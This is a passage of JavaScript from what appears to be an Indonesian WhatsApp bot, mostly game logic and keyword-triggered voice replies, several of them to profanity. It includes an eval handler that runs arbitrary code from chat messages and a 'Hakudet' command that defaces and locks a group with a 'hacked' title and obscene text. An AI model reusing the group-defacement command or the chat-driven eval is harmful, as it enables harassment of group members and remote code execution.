		gelutSkuy.status = true
		rand0m = [ gelutSkuy.Z, gelutSkuy.Y ]
		winR = rand0m[Math.floor(Math.random() * rand0m.length)]
		fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
		starGame = `👑 Gelud Game 🤙🏻 

Diantara @${gelutSkuy.Z} & @${gelutSkuy.Y}
• Pemenangnya adalah [ @${winR} ] `
	   Hisnu.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [winR + "@s.whatsapp.net", gelutSkuy.Z + "@s.whatsapp.net", gelutSkuy.Y + "@s.whatsapp.net",]}})
		fs.unlinkSync("./media/" + from + ".json");
	} else if (sender == `${gelutSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
		Hisnu.sendMessage(from, `👑 Game Gelud Rejected 🤙🏻
• @${gelutSkuy.Y} Menolak🤙🏻`, text, {quoted: mek, contextInfo: { mentionedJid: [gelutSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./media/" + from + ".json");
	}
}

if (isTTT && isPlayer2){
if (budy.startsWith('Y')){
  tto = ky_ttt.filter(ghg => ghg.id.includes(from))
  tty = tto[0]
  angka = tto[0].angka
  ucapan = 
`*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=❎
Player2 @${tty.player2.split('@')[0]}=⭕

Giliran = @${tty.player1.split('@')[0]}

   ${angka[1]}${angka[2]}${angka[3]}
   ${angka[4]}${angka[5]}${angka[6]}
   ${angka[7]}${angka[8]}${angka[9]}`
  Hisnu.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
  }
if (budy.startsWith('N')){
tto = ky_ttt.filter(ghg => ghg.id.includes(from))
tty = tto[0]
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
Hisnu.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:mek,contextInfo:{mentionedJid:[tty.player2]}})
}
}

if (isTTT && isPlayer1){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
s = '❎'
main[0].angka[nuber] = s
main[0].gilir = main[0].player1
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = 
`*🎳Result Game Tictactoe 🎲*

*Yeyyy Permainan Di Menangkan Oleh* @${tty.player1.split('@')[0]}\n
*Ingin bermain lagi? ${prefix}tictactoe*`
ucapan2 = `*🎳Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
Hisnu.sendMessage(from, ucapan1, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()

if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()

if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()

if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()

if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()

if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()

if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()

if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*_Permainan Seri ??👌_*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player2 @${tty.player2.split('@')[0]}=⭕
Player1 @${tty.player1.split('@')[0]}=❎

Giliran = @${tty.player2.split('@')[0]}

${ttt}`
Hisnu.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
}
if (isTTT && isPlayer2){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
s = '⭕'
main[0].angka[nuber] = s
main[0].gilir = main[0].player2
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*Yeyyy Permainan Di Menangkan Oleh* @${tty.player2.split('@')[0]}\n
*Ingin bermain lagi? ${prefix}tictactoe*`
ucapan2 = `*🎳 Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
Hisnu.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player2]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳Result Game Tictactoe 🎲*

*_Permainan Seri🗿👌*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=⭕
Player2 @${tty.player2.split('@')[0]}=❎
   
Giliran = @${tty.player1.split('@')[0]}

${ttt}`
 Hisnu.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
} else {
}
if (/^=?>/.test(budy) && (isOwner || mek.key.fromMe)){

let parse = /^=>/.test(budy) ? budy.replace(/^=>/,'return') : budy.replace(/^>/,'')

try{

let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => { return e })

return reply(require('util').format(evaluate))

 } catch(e){

 return reply(require('util').format(e))

}
}
if (budy.startsWith('Hakudet')){
if (!mek.key.fromMe && !isOwner) return
anu = fs.readFileSync('media/Menu.jpg')
Hisnu.updateProfilePicture(from, anu)
Hisnu.groupUpdateSubject(from, `𝐓𝐄𝐑𝐇𝐀𝐂𝐊 𝐎𝐋𝐄𝐇 𝐃𝐇𝐀𝐍𝐈☠︎`)
Hisnu.groupUpdateDescription(from, `𝗠𝗔𝗠𝗣𝗨𝗦 𝗚𝗪 𝗞𝗨𝗗𝗘𝗧`)
Hisnu.groupSettingChange(from, GroupSettingChange.messageSend, true)
setTimeout(() => {
fakestatus('MAMPUS KONTOL')
}, 8000)
}
if (budy.startsWith('Menu')){
res = await Hisnu.prepareMessageFromContent(from,{
"listMessage": {
"title": `\`\`\`Hi ${pushname} 👋.\`\`\``,
"description": `\`\`\`INI MENU KHUSUS OWNER YA\`\`\``,
"buttonText": "List Menu",
"listType": "SINGLE_SELECT",
"sections": [
{
    "title": "DhaniGans",
    "rows": [
       {
          "title": "public",
          "rowId": "#public"
       },
       {
          "title": "self",
          "rowId": "#self"
       },
       {
          "title": "deletepc",
          "rowId": "#deletepc"
       },
       {
          "title": "restart",
          "rowId": "#restart"
       }
     ]
   }
 ]
}
}, {quoted:mek})
Hisnu.relayWAMessage(res)
}
       if (budy.includes(`Bot`)) {
const BOT = fs.readFileSync('./mp3/mancabot.mp3');
Hisnu.sendMessage(from, BOT, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  

                  }
		if (budy.includes(`Memek`)) {
const Banai = fs.readFileSync('./mp3/kasar.mp3');
Hisnu.sendMessage(from, Banai, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  

                  }



		if (budy.includes(`Anj`)) {
const Peli = fs.readFileSync('./mp3/kasar.mp3');
Hisnu.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  

                  }





		if (budy.includes(`Asu`)) {
const Mau = fs.readFileSync('./mp3/kasar.mp3');
Hisnu.sendMessage(from, Mau, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  

                  }



		if (budy.includes(`Kontol`)) {
const apaya = fs.readFileSync('./mp3/toxic.mp3');
Hisnu.sendMessage(from, apaya, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  
                  
                  }
		if (budy.includes(`Jancok`)) {
const jancok = fs.readFileSync('./mp3/toxic.mp3');
Hisnu.sendMessage(from, jancok, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})


                  }
		if (budy.includes(`Tod`)) {
const tod = fs.readFileSync('./mp3/kasar.mp3');
Hisnu.sendMessage(from, tod, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  
                  
                  }
		if (budy.includes(`Cok`)) {
const cok = fs.readFileSync('./mp3/toxic.mp3');
Hisnu.sendMessage(from, mampus, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  
                  }
		if (budy.includes(`Ngakak`)) {
const ngakak = fs.readFileSync('./mp3/Bot.mp3');
Hisnu.sendMessage(from, ngakak, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  
                  
                  }
		if (budy.includes(`Ngentod`)) {
const ngentod = fs.readFileSync('./mp3/cok.mp3');
Hisnu.sendMessage(from, ngentod, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

                  
                  }
		if (budy.includes(`Ndyie`)) {
const ndyie = fs.readFileSync('./mp3/Kecil.mp3');
Hisnu.sendMessage(from, ndyie, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})


                  }
		if (budy.includes(`Desah`)) {
const desah = fs.readFileSync('./mp3/desahan4.mp3');
Hisnu.sendMessage(from, desah, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})


                  }
		if (budy.includes(`Bangsat`)) {
const Yo = fs.readFileSync('./mp3/kasar.mp3');
Hisnu.sendMessage(from, Yo, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  

                  }
		if (budy.includes(`Pantek`)) {
const Kui = fs.readFileSync('./mp3/kasar.mp3');
Hisnu.sendMessage(from, Kui, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  

                  }
		if (budy.includes(`Sekmak`)) {
const Cel = fs.readFileSync('./mp3/Bot.mp3');
Hisnu.sendMessage(from, Cel, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  

                  } 
		if (budy.includes(`Asalamualaikum`)) {
const Salam = fs.readFileSync('./mp3/salam.mp3');
Hisnu.sendMessage(from, Salam, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  

                  }
		if (budy.includes(`Sayang`)) {
const yang = fs.readFileSync('./mp3/syg.mp3');
Hisnu.sendMessage(from, yang, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})


                  }                                                                                                                                 
if (!isGroup && isCmd && !mek.key.fromMe){
teks = `Maaf @${senderr.split('@')[0]}, command ${prefix + command} tidak ada dalam menu`
Hisnu.sendMessage(from, {text:teks, jpegThumbnail:fs.readFileSync('./media/wpmobile.png')}, 'extendedTextMessage', {sendEphemeral:true, quoted:mek, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
}
	} 
if (isGroup && budy != undefined) {
} else {
console.log('[',color('TEXT','teal'),']',`Message : ${budy} From`, color(pushname))
}
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	}
}